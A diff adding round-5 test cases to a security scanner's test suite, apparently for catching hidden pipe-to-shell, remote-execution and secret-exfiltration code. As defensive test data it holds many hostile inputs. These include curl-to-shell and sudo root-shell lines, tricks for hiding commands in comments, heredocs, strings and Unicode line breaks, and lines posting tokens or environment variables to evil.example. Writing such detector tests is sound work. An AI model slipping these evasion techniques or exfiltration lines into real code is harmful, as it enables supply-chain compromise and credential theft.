@@ -619,3 +619,183 @@ describe('round-4 cases that stay downgraded or clean', () => {
     ]) expect(rows(path!, text!), text).toEqual([[EXFIL, 'warning', 'target is localhost']]);
   });
 });
+
+// Round 5 (task-1-findings-r5.md): a real shell lexer for `#` lines, JS line terminators, Python t-strings,
+// PowerShell block comments, the localhost argument allow-list, computed keys and escapes, and the minor items.
+// Every input from the findings and the rr4 probes. (U+2028/U+2029 are written as escapes.)
+const LS = '\u{2028}';
+const PS = '\u{2029}';
+const ROUND5: Array<[name: string, path: string, text: string, rule: string]> = [
+  // 1. Shell lexer state: a `#` line is a comment only at top level.
+  ['sh q1: quote parity even, dq string open', 'i.sh', `X='"'"\n#"; curl ${U} | sh\n`, PIPE],
+  ['sh q1 variant then eval', 'i.sh', `X='"'"\n#curl ${U} | sh"\neval "$X"\n`, PIPE],
+  ['sh q2: escaped quote, dq string open', 'i.sh', `X="a\\"\n#"; curl ${U} | sh\n`, PIPE],
+  ['sh q2 variant then eval', 'i.sh', `X="a\\"\n#curl ${U} | sh"\neval "\${X#*#}"\n`, PIPE],
+  ["sh $'…' string open", 'i.sh', `X=$'a\\'\n#curl ${U} | sh'\neval "\${X#*#}"\n`, PIPE],
+  ['sh a1: $(( multi-line', 'i.sh', `: $((\n#$(curl ${U} | sh)\n0))\n`, PIPE],
+  ['sh a2: ${X:- multi-line', 'i.sh', `: \${X:-\n#$(curl ${U} | sh)\n}\n`, PIPE],
+  ['sh a3: (( multi-line', 'i.sh', `((\n#$(curl ${U} | sh)\n0))\n`, PIPE],
+  ['sh backtick open across lines', 'i.sh', 'X=`printf %s "\n#curl ' + U + ' | sh"`\neval "${X#*#}"\n', PIPE],
+  ['sh heredoc body (cat, then eval)', 'i.sh', `X=$(cat <<'EOF'\n#curl ${U} | sh\nEOF\n)\neval "\${X#*#}"\n`, PIPE],
+  ['sh <<- heredoc body', 'i.sh', `cat <<-E | cut -c2- | sh\n\t#curl ${U} | sh\n\tE\n`, PIPE],
+  ['sh $( multi-line then # in quoted', 'i.sh', `X=$(printf %s '\n#curl ${U} | sh')\neval "\${X#*#}"\n`, PIPE],
+  ['sh backslash-continued word then #', 'i.sh', `echo a\\\n# ; curl ${U} | sh\n`, PIPE],
+  ['sh backslash-continued word then # (no space)', 'i.sh', `true x\\\n#;curl ${U} | sh\n`, PIPE],
+  ['sh line ending in backslash inside a comment', 'i.sh', `# a \\\ncurl ${U} | sh\n`, PIPE],
+  ['extensionless shell with q1', 'install', `#!/bin/sh\nX='"'"\n#"; curl ${U} | sh\n`, PIPE],
+  ['Makefile define body', 'Makefile', `define X\n#curl ${U} | sh\nendef\n`, PIPE],
+  // Other #-comment languages stay conservative.
+  ['rb q1 parity trick', 'i.rb', `X='"'"\n#"; curl ${U} | sh\n`, PIPE],
+  ['pl q2 escaped quote', 'i.pl', `my $x = "a\\"\n#"; curl ${U} | sh\n`, PIPE],
+  ['rb regex literal holding a quote', 'i.rb', `r = /"/; x = "\n#curl ${U} | sh"\nsystem(x)\n`, PIPE],
+  ['ps1 q1 parity trick', 'i.ps1', `$x = '"'"\n#"; curl.exe ${U} | sh\n`, PIPE],
+  ['ps1 backtick-escaped quote', 'i.ps1', '$x = "a`"\n#"; iex (iwr ' + U + ')\n', FETCH],
+  ['ps1 here-string', 'i.ps1', `$x = @"\n# iex (iwr ${U})\n"@\niex $x\n`, FETCH],
+  // N4: PowerShell block comments.
+  ['ps1 #> closes block comment then code', 'i.ps1', `<# a\n#> iex (iwr ${U})\n`, FETCH],
+  ['ps1 #> closes then curl|sh', 'i.ps1', `<# a\n#> curl.exe ${U} | sh\n`, PIPE],
+  ['ps1 <# mid-line opens a block', 'i.ps1', `$a = 1 <# x\n#> iex (iwr ${U})\n`, FETCH],
+  // Minor: Ruby/Perl DATA sections read their own text.
+  ['rb __END__ / DATA.read', 'i.rb', `eval DATA.read.delete('#')\n__END__\n#curl ${U} | sh\n`, PIPE],
+  ['pl __DATA__ / <DATA>', 'i.pl', `my $c = join "", <DATA>; $c =~ s/#//; system($c);\n__DATA__\n#curl ${U} | sh\n`, PIPE],
+  // N1: U+2028 / U+2029 end a JS line.
+  ['js U+2028 ends // comment', 'i.js', `// note${LS}require("child_process").execSync("curl ${U} | sh")\n`, PIPE],
+  ['js U+2029 ends // comment', 'i.js', `// note${PS}require("child_process").execSync("curl ${U} | sh")\n`, PIPE],
+  ['js U+2028 string continuation then //', 'i.js', `x = "a\\${LS}"\n// "; require("child_process").execSync("curl ${U} | sh") //\n`, PIPE],
+  ['js U+2028 inside block comment line closes', 'i.js', `/* a${LS}*/ require("child_process").execSync("curl ${U} | sh") /* b */\n`, PIPE],
+  ['js U+2028 in a block-comment header line', 'i.js', `/* a */ // b${LS}require("child_process").execSync("curl ${U} | sh")\n`, PIPE],
+  ['js U+2028 file: regex argument', 'i.js', `x = 1${LS}\nnew RegExp("curl ${U} | sh")\n`, PIPE],
+  // N2: Python t-strings interpolate.
+  ['py t-string braces hide a # line (3.14)', 'i.py', `x = t"""{\n"""\n#curl ${U} | sh\n"""\n}"""\nimport os; os.system(x.strings[1].strip("#\\n"))\n`, PIPE],
+  ['py t-string braces, string-escape shape', 'i.py', `x = t"""{\n"""\n#""" + __import__("os").system("curl ${U} | sh") + """\n"""}"""\n`, PIPE],
+  ['py t-string regex arg', 'i.py', `import re, os\nre.compile(t"{os.system('curl ${U} | sh')}")\n`, PIPE],
+  ['py tr-string regex arg', 'i.py', `import re, os\nre.compile(tr"{os.system('curl ${U} | sh')}")\n`, PIPE],
+  ['py T-string localhost', 'i.py', `requests.post(T"http://localhost:{port}/s", data=os.environ)\n`, EXFIL],
+  ['py t-string localhost', 'i.py', `requests.post(t"http://localhost:{port}/s", data=os.environ)\n`, EXFIL],
+  // N5: later arguments are an allow-list.
+  ['js fetch opts(process.env)', 'i.js', `fetch("http://localhost/", mk(process.env.GITHUB_TOKEN))\n`, EXFIL],
+  ['axios mk(process.env) config', 'i.js', `axios.post("http://localhost/", process.env.GITHUB_TOKEN, mk(process.env))\n`, EXFIL],
+  ['js fetch Object.assign(env, cfg)', 'i.js', `fetch("http://localhost/", Object.assign({ method: "POST", body: process.env.GITHUB_TOKEN }, cfg))\n`, EXFIL],
+  ['js await fetch opts(process.env.TOKEN)', 'i.js', `await fetch("http://localhost:3000/api", opts(process.env.TOKEN))\n`, EXFIL],
+  ['js option key outside the allow-list', 'i.js', `fetch("http://localhost/", { body: process.env.T, signal: s })\n`, EXFIL],
+  ['js shorthand key', 'i.js', `const dispatcher = x; fetch("http://localhost/", { body: JSON.stringify(process.env), dispatcher })\n`, EXFIL],
+  ['js option value is a call', 'i.js', `fetch("http://localhost/", { body: process.env.T, headers: mk() })\n`, EXFIL],
+  ['py headers=H variable', 'i.py', `requests.post("http://localhost:8080/s", json={"t": os.environ["T"]}, timeout=5, headers=H)\n`, EXFIL],
+  ['py kwarg outside the allow-list', 'i.py', `requests.post("http://localhost/", data=os.environ, verify=v)\n`, EXFIL],
+  ['py positional variable', 'i.py', `requests.post("http://localhost/", os.environ, None, None, h)\n`, EXFIL],
+  ['py data from a call', 'i.py', `requests.post("http://localhost/", data=mk(os.environ))\n`, EXFIL],
+  // N6: computed or escaped keys.
+  ['js computed key dispatcher', 'i.js', `fetch("http://localhost/", { method: "POST", body: process.env.GITHUB_TOKEN, ["dis"+"patcher"]: d })\n`, EXFIL],
+  ['js computed key [k]', 'i.js', `fetch("http://localhost/", { body: JSON.stringify(process.env), [k]: v })\n`, EXFIL],
+  ['js unicode-escape key dispatcher', 'i.js', `fetch("http://localhost/", { method: "POST", body: process.env.GITHUB_TOKEN, dispatch\\u0065r: d })\n`, EXFIL],
+  ['js \\x escape in a key string', 'i.js', `fetch("http://localhost/", { method: "POST", body: process.env.GITHUB_TOKEN, "dispatch\\x65r": d })\n`, EXFIL],
+  ['axios computed proxy key', 'i.js', `axios.post("http://localhost/", process.env, { [k]: v })\n`, EXFIL],
+  // rr4 probes that were already critical: keep them so.
+  ['sh localhost with user@', 'i.sh', `curl -d "$GITHUB_TOKEN" http://localhost@evil.example/\n`, EXFIL],
+  ['sh localhost ${VAR}', 'i.sh', `curl -d "$GITHUB_TOKEN" "http://localhost:\${P}/"\n`, EXFIL],
+  ['sh localhost then ; second curl', 'i.sh', `sudo curl -d "$GITHUB_TOKEN" http://localhost/ ; curl -d "$GITHUB_TOKEN" http://evil.example/\n`, EXFIL],
+  ['sh localhost then && second curl', 'i.sh', `curl -d "$GITHUB_TOKEN" http://localhost/ && curl -d @/tmp/x evil.example\n`, EXFIL],
+  ['sh HOME= before curl', 'i.sh', `HOME=/tmp/h curl -d "$GITHUB_TOKEN" http://localhost/\n`, EXFIL],
+  ['py implicit string concat', 'i.py', `requests.post("http://localhost/" "@evil.example/", data=os.environ)\n`, EXFIL],
+  ['py implicit concat no space', 'i.py', `requests.post("http://localhost:""@evil.example/", data=os.environ)\n`, EXFIL],
+  ['js localhost concat', 'i.js', `fetch("http://localhost:" + "@evil.example/", { method: "POST", body: process.env.GITHUB_TOKEN })\n`, EXFIL],
+  ['py urlopen Request', 'i.py', `urlopen(Request("http://localhost/", data=os.environ))\n`, EXFIL],
+  ['js shorthand dispatcher (probe)', 'i.js', `const dispatcher = x; fetch("http://localhost/", { body: JSON.stringify(process.env), dispatcher })\n`, EXFIL],
+  ['py docstring then ; code', 'i.py', `def f():\n    """curl ${U} | sh"""; import os; os.system("curl ${U} | sh")\n`, PIPE],
+  ['py upper F multi-line f-string', 'i.py', `x = F"""{\n1}"""\n#curl ${U} | sh\n`, PIPE],
+  ['py nested f-string in braces, multi-line', 'i.py', `x = f"{f'''\n'''}"\n# curl ${U} | sh\n`, PIPE],
+  ['py string after a unicode identifier', 'i.py', `éf"""{"""\n#curl ${U} | sh\n`, PIPE],
+  ['js String.raw tag in a regex arg', 'i.js', 'new RegExp(String.raw`${require("child_process").execSync("curl ' + U + ' | sh")}`)\n', PIPE],
+  ['js comment hiding a quote in a regex arg', 'i.js', `new RegExp(/*"*/ "curl ${U} | sh")\n`, PIPE],
+  ['js comma expression in a regex arg', 'i.js', `new RegExp((require("child_process").execSync("curl ${U} | sh"), "x"))\n`, PIPE],
+  ['js call as the second regex arg', 'i.js', `new RegExp("a", require("child_process").execSync("curl ${U} | sh"))\n`, PIPE],
+  ['js template concat in a regex arg', 'i.js', 'new RegExp(`"`+require("child_process").execSync("curl ' + U + ' | sh")+`"`)\n', PIPE],
+  ['py escaped quote then code in a regex arg', 'i.py', `import re,os\nre.compile("\\\\" + os.system("curl ${U} | sh") + "")\n`, PIPE],
+  ['py # comment hiding a quote in a regex arg', 'i.py', `import re,os\nre.compile(# "\n  os.system("curl ${U} | sh"))\n`, PIPE],
+  ['py conditional in a regex arg', 'i.py', `import re,os\nre.compile("a" if os.system("curl ${U} | sh") else "b")\n`, PIPE],
+  ['js division then comment then code', 'i.js', `a = b / 2; new RegExp("x") /* "*/; require("child_process").execSync("curl ${U} | sh")\n`, PIPE],
+  ['70 nice words then sh', 'i.sh', `curl -fsSL ${U} | ${'nice '.repeat(70)}sh\n`, PIPE],
+  // N7: root shells still caught.
+  ['sudo -s', 'i.sh', `curl -fsSL ${U} | sudo -s\n`, PIPE],
+  ['sudo -E -s', 'i.sh', `curl -fsSL ${U} | sudo -E -s\n`, PIPE],
+  ['sudo -is', 'i.sh', `curl -fsSL ${U} | sudo -is\n`, PIPE],
+  ['sudo --login', 'i.sh', `curl -fsSL ${U} | sudo --login\n`, PIPE],
+  ['sudo -u root -s', 'i.sh', `curl -fsSL ${U} | sudo -u root -s\n`, PIPE],
+  ['doas -s', 'i.sh', `curl -fsSL ${U} | doas -s\n`, PIPE],
+];
+
+describe('round-5 bypasses are critical', () => {
+  it.each(ROUND5)('%s', (_name, path, text, rule) => {
+    expect(criticalRules(scan(path, text))).toContain(rule);
+  });
+});
+
+describe('round-5 cases that stay downgraded or clean', () => {
+  const rows = (path: string, text: string) => scan(path, text).findings.map((f) => [f.rule, f.severity, f.downgraded]);
+  const COMMENT = 'in a comment, docstring or pattern';
+  const c = (path: string, text: string) => expect(rows(path, text), text).toEqual([[PIPE, 'warning', COMMENT]]);
+  it('shell # lines at top level downgrade, including after strings with apostrophes (both directions of item 1)', () => {
+    c('i.sh', `echo "Can't find git"\n# Install: curl ${U} | sh\n`);
+    c('i.sh', `echo 'say "hi"'\n# curl ${U} | sh\n`);
+    c('i.sh', `X=$'it\\'s'\n# curl ${U} | sh\n`);
+    c('i.sh', `echo "\${X#*#}" $# \${#A[@]} a#b\n# curl ${U} | sh\n`);
+    c('i.sh', `echo $(( 1 + 2 )) \${X:-a} "$(echo ')')"\n# curl ${U} | sh\n`);
+    c('i.sh', `if (( x > 1 )); then :; fi\n# curl ${U} | sh\n`);
+    c('i.sh', `cat <<'EOF'\nIt's fine\nEOF\n# curl ${U} | sh\n`);
+    c('i.sh', `echo hi # it's a trailing comment\n# curl ${U} | sh\n`);
+    c('i.sh', `f() {\n  # curl ${U} | sh\n  :\n}\n`);
+    c('install', `#!/bin/bash\necho "Can't"\n# curl ${U} | sh\n`);
+    c('Makefile', `all:\n\techo "Can't"\n# curl ${U} | sh\n`);
+  });
+  it('other #-comment languages downgrade before any line they cannot follow', () => {
+    c('i.rb', `puts "x"\n# curl ${U} | sh\n`);
+    c('i.rb', `puts 'it\\'s'\n# curl ${U} | sh\n`);
+    c('i.pl', `print "x\\n";\n# curl ${U} | sh\n`);
+    c('i.ps1', `Write-Host "it's" 'a''b'\n# curl.exe ${U} | sh\n`);
+    c('i.ps1', `$a = 1\n# curl.exe ${U} | sh\n`);
+  });
+  it('a JS file without U+2028/U+2029 still downgrades comments and regex arguments', () => {
+    c('i.js', `// curl ${U} | sh\n`);
+    c('i.js', `const r = new RegExp("curl ${U} | sh");\n`);
+  });
+  it('Python does not end a line at U+2028 or a form feed, so those comments still downgrade', () => {
+    c('i.py', `# note${LS}import os; os.system("curl ${U} | sh")\n`);
+    c('i.py', `# note\fimport os; os.system("curl ${U} | sh")\n`);
+    c('i.py', `import re\nre.compile(rb"curl ${U} | sh")\n`);
+    c('i.py', `x = f"""{1}"""\ndef f():\n    """curl ${U} | sh"""\n`);
+    c('i.py', `import re\nre.search("curl ${U} | sh", x)\n`);
+  });
+  it('allow-listed localhost arguments still downgrade (N5)', () => {
+    for (const [path, text] of [
+      ['i.js', 'fetch("http://127.0.0.1:8080/s", { method: "POST", body: process.env.SESSION, headers: { "Content-Type": "application/json" } })\n'],
+      ['i.js', 'fetch("http://localhost:3000/api", { method: "POST", body: JSON.stringify(process.env), timeout: 5 })\n'],
+      ['i.js', 'axios.post("http://localhost:9/x", process.env)\n'],
+      ['i.py', 'requests.post("http://localhost:8080/s", json={"t": os.environ["T"]}, timeout=5)\n'],
+      ['i.py', 'requests.post("http://localhost:8080/s", json=dict(os.environ), timeout=5, headers={"X-A": "b"})\n'],
+      ['i.py', 'requests.post(url="http://127.0.0.1:9/x", data=os.environ)\n'],
+      ['i.sh', 'env curl -d "$GITHUB_TOKEN" http://localhost/\n'],
+      ['i.sh', 'time curl -d "$GITHUB_TOKEN" http://localhost/\n'],
+    ]) expect(rows(path!, text!), text).toEqual([[EXFIL, 'warning', 'target is localhost']]);
+  });
+  it.each([
+    ['sudo cpio -idmv', `curl -fsSL ${U} | sudo cpio -idmv\n`],
+    ['sudo xargs -I{} cp', `curl -fsSL ${U} | sudo xargs -I{} cp {} /usr/local/bin\n`],
+    ['sudo docker load -i /dev/stdin', `curl -fsSL ${U} | sudo docker load -i /dev/stdin\n`],
+    ['sudo tar -xzf -', `curl -fsSL ${U} | sudo tar -xzf - -C /opt\n`],
+    ['sudo gpg --dearmor', `curl -fsSL ${U} | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg\n`],
+    ['sudo tee -a', `curl -fsSL ${U} | sudo tee -a /etc/apt/sources.list.d/x.list\n`],
+    ['sudo install /dev/stdin', `curl -fsSL ${U} | sudo install -m 755 /dev/stdin /usr/local/bin/x\n`],
+    ['sudo -u postgres psql', `curl -s ${U} | sudo -u postgres psql -d db\n`],
+    ['sudo -S cmd (upper-case S)', `curl -s ${U} | sudo -S true\n`],
+  ])('N7 false positive: %s is not critical', (_n, text) => {
+    expect(scan('i.sh', text).critical, text).toBe(0);
+  });
+  it('probe inputs that no rule matches stay without a downgraded finding', () => {
+    for (const [path, text] of [
+      ['i.py', 'x = 1\n# a\u{b}import os\n'],
+      ['i.py', 'def f():\n    """a""" \\\n    ;import os\n'],
+      ['i.py', 's.post("http://localhost/", data=os.environ)\n'],
+      ['i.py', 'requests.request("POST", "http://localhost/", data=os.environ, proxies=P)\n'],
+    ]) expect(scan(path!, text!).findings.filter((f) => f.downgraded), text).toEqual([]);
+  });
+});
